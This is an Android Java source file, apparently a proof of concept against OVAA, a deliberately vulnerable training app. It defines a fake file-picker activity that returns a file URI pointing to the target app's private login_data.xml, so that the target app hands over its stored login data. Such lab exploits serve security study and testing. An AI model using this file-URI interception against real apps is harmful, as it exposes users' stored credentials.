package com.mbl.test.paddleactivity;

import androidx.appcompat.app.AppCompatActivity;

import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;

public class InterceptFilePickerActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
//        setContentView(R.layout.activity_intercept_file_picker);
        Intent intent = new Intent();
        intent.setData(Uri.parse("file:///data/data/oversecured.ovaa/shared_prefs/login_data.xml"));
        setResult(RESULT_OK, intent);
        finish();
    }
}